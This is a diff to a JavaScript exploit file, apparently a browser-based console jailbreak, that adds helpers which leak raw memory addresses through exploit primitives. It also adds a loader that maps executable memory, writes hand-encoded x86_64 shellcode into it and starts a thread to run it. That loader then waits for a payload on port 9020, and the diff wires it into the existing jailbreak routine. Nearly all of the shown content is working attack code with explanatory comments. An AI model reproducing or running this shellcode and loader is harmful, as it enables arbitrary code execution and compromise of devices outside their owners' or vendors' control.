@@ -2539,6 +2539,133 @@ async function PayloadLoader(Pfile) {
   return 1;
 }
 //================================================================================================
+// Malloc ========================================================================================
+//================================================================================================
+// This function is a C-style 'malloc' (memory allocate) implementation
+// for this low-level exploit environment.
+// It allocates a raw memory buffer of 'sz' BYTES and returns a
+// raw pointer to it, bypassing normal JavaScript memory management.
+function malloc(sz) {
+  // 1. Allocate a standard JavaScript Uint8Array.
+  //    The total size is 'sz' bytes (the requested size) plus a
+  //    0x10000 byte offset (which might be for metadata or alignment).
+  var backing = new Uint8Array(0x10000 + sz);
+  // 2. Add this array to the 'no garbage collection' (nogc) list.
+  //    This is critical to prevent the JS engine from freeing this
+  //    memory block. If it were freed, 'ptr' would become a "dangling pointer"
+  //    and lead to a 'use-after-free' crash.
+  nogc.push(backing);
+  // 3. This is the core logic to "steal" the raw pointer from the JS object.
+  //    - mem.addrof(backing): Gets the address of the JS 'backing' object.
+  //    - .add(0x10): Moves to the internal offset (16 bytes) where the
+  //      pointer to the raw data buffer is stored.
+  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
+  //
+  //    'ptr' now holds the *raw memory address* of the array's data.
+  var ptr = mem.readp(mem.addrof(backing).add(0x10));
+  // 4. Attach the original JS 'backing' array itself as a property
+  //    to the 'ptr' object.
+  //    This is a convenience, bundling the raw pointer ('ptr') with a
+  //    "safe" JS-based way ('ptr.backing') to access the same memory.
+  ptr.backing = backing;
+  // 5. Return the 'ptr' object, which now acts as a raw pointer
+  //    to the newly allocated block of 'sz' bytes.
+  return ptr;
+}
+//================================================================================================
+// Malloc for 32-bit =============================================================================
+//================================================================================================
+// This function mimics the C-standard 'malloc' function but for a 32-bit
+// aligned buffer. It allocates memory using a standard JS ArrayBuffer
+// but returns a *raw pointer* to its internal data buffer.
+function malloc32(sz) {
+  // 1. Allocate a standard JavaScript byte array.
+  //    'sz * 4' suggests 'sz' is the number of 32-bit (4-byte) elements.
+  //    The large base size (0x10000) might be to ensure a specific 
+  //    allocation type or to hold internal metadata for this "fake malloc".
+  var backing = new Uint8Array(0x10000 + sz * 4);
+  // 2. Add this array to the 'no garbage collection' (nogc) list.
+  //    This is CRITICAL. It prevents the JS engine from freeing this
+  //    memory block. If the 'backing' array was collected, 'ptr' would
+  //    become a "dangling pointer" and cause a 'use-after-free' crash.
+  nogc.push(backing);
+  // 3. This is the core logic for getting the raw address.
+  //    - mem.addrof(backing): Gets the memory address of the JS 'backing' object.
+  //    - .add(0x10): Moves to the offset (16 bytes) where the internal
+  //      data pointer (pointing to the raw buffer) is stored.
+  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
+  //
+  //    'ptr' now holds the *raw memory address* of the array's actual data.
+  var ptr = mem.readp(mem.addrof(backing).add(0x10));
+  // 4. This is a convenience. It attaches a 32-bit view of the *original*
+  //    JS buffer (backing.buffer) as a property to the 'ptr' object.
+  //    This bundles the raw pointer ('ptr') with a "safe" JS-based way
+  //    to access the same memory ('ptr.backing').
+  ptr.backing = new Uint32Array(backing.buffer);
+  // 5. Return the 'ptr' object. This object now represents a raw
+  //    pointer to the newly allocated and GC-protected memory.
+  return ptr;
+}
+//================================================================================================
+// Bin Loader ====================================================================================
+//================================================================================================
+function runBinLoader() {
+  // 1. Allocate a large (0x300000 bytes) memory buffer for the *main* payload.
+  //    It is marked as Readable, Writable, and Executable (RWX).
+  //    This buffer will likely be passed AS AN ARGUMENT to the loader.
+  var payload_buffer = chain.sysp('mmap', 0, 0x300000, (PROT_READ | PROT_WRITE | PROT_EXEC), MAP_ANON, -1, 0);
+  // 2. Allocate a smaller (0x1000 bytes) buffer for the
+  //    *loader shellcode itself* using the custom malloc32 helper.
+  var payload_loader = malloc32(0x1000);
+  // 3. Get the JS-accessible backing array for the loader buffer.
+  var BLDR = payload_loader.backing;
+  // 4. --- START OF SHELLCODE ---
+  //    This is not JavaScript. This is raw x86_64 machine code, written
+  //    as 32-bit integers (hex values), directly into the executable buffer.
+  //    This code is the "BinLoader" itself.
+  BLDR[0]  = 0x56415741; BLDR[1]  = 0x83485541; BLDR[2]  = 0x894818EC;
+  BLDR[3]  = 0xC748243C; BLDR[4]  = 0x10082444; BLDR[5]  = 0x483C2302;
+  BLDR[6]  = 0x102444C7; BLDR[7]  = 0x00000000; BLDR[8]  = 0x000002BF;
+  BLDR[9]  = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
+  BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
+  BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
+  BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
+  BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
+  BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
+  BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
+  BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
+  BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
+  BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
+  BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
+  BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
+  BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
+  BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
+  BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
+  BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
+  BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
+  BLDR[60] = 0xC3050FCA;
+  // --- END OF SHELLCODE ---
+  // 5. Use the 'mprotect' system call to *explicitly* mark the
+  //    'payload_loader' buffer as RWX (Readable, Writable, Executable).
+  //    This is a "belt and suspenders" call to ensure the OS will
+  //    allow the CPU to execute the shellcode we just wrote.
+  chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
+  // 6. Allocate memory for a pthread (thread) structure.
+  var pthread = malloc(0x10);
+  // 7. Lock the main payload buffer in memory to prevent it from
+  //    being paged out to disk.
+  sysi('mlock', payload_buffer, 0x300000);
+  //    Create a new native thread.
+  call_nze(
+    'pthread_create',
+    pthread, // Pointer to the thread structure
+    0, // Thread attributes (default)
+    payload_loader, // The START ROUTINE (entry point). This is the address of our shellcode.
+    payload_buffer // The ARGUMENT to pass to the shellcode.
+  );
+  window.log("BinLoader is ready. Send a payload to port 9020 now", "green");
+}
+//================================================================================================
 // Init LapseGlobal Variables ====================================================================
 //================================================================================================
 function Init_LapseGlobals() {
@@ -3179,6 +3306,7 @@ async function doLapseExploit() {
     try {
       if (sysi("setuid", 0) == 0) {
         window.log("\nAlready jailbroken, no need to re-jailbrake", "green");
+        runBinLoader();
         return 0;
       }
     }
